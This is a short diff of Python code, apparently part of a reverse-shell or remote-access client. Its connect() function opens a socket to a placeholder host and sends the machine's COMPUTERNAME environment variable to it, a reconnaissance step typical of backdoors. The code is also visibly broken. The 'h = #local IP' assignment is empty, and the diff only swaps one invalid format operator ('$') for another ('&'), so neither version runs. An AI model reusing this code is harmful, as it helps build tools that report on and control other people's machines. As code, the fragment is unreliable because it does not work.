@@ -11,7 +11,7 @@ def connect():
     h = #local IP
 
     try:
-        print("[!!!] Connecting to %s:%s"$(host,port))
+        print("[!!!] Connecting to %s:%s"&(host,port))
         s.connect((h,p))
         print("[***] Connected")
         s.send(os.environ["COMPUTERNAME"])
